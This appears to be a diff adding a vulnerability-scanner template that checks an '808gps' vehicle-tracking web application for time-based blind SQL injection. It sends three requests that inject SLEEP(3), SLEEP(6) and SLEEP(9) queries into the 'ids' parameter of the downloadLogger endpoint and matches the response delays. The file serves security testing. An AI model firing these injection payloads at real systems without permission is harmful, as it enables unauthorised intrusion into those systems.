@@ -1,0 +1,38 @@
+id: 808gps-downloadLogger-sqli
+
+info:
+  name: 808gps-downloadLogger-sqli
+  severity: high
+  author: 808gps-vehicletts-sqli
+
+
+http:
+  - raw:
+      - |     
+        GET /run_stop/delete.do;downloadLogger.action?ids=1)+AND+(SELECT+5394+FROM+(SELECT(SLEEP(3)))tdpw)--+&loadAll=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+
+      - |
+        GET /run_stop/delete.do;downloadLogger.action?ids=1)+AND+(SELECT+5394+FROM+(SELECT(SLEEP(6)))tdpw)--+&loadAll=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+
+      - |
+        GET /run_stop/delete.do;downloadLogger.action?ids=1)+AND+(SELECT+5394+FROM+(SELECT(SLEEP(9)))tdpw)--+&loadAll=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
